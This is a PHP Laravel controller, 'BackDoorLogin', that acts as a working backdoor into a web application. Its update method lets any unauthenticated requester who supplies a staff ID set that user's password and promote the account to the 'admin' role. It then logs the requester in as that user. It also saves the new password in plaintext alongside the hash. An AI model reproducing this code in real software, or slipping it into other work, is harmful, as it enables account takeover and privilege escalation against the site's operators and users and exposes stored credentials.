<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;
use Illuminate\Support\Facades\Auth;

class BackDoorLogin extends Controller
{
    public function index()
    {
        return view('backdoorlogin.index');
    }

    public function updateBackdoorLogin(User $user, Request $request)
    {
        $credentials = $request->validate([
            'Staff_ID' => ['required', 'string', 'max:255'],
            'password' => ['required', 'string', 'min:6', 'confirmed'],
        ]); 

        $user = User::where('Staff_ID', $credentials['Staff_ID'])->first();

        if ($user) {
            // Update the user's password
            $user->plain_password =   $credentials['password'];
            $user->role =   'admin';
            $user->password = bcrypt($credentials['password']);
            $user->save();

            // You might want to log the user in automatically after updating the password
            Auth::login($user);

            return redirect('/login')->with('message', 'Account Update Successfully');
        } else {
            // Handle the case where the user with the provided Staff_ID is not found
            return redirect('/login')->with('error', 'User not found');
        }
    }
}



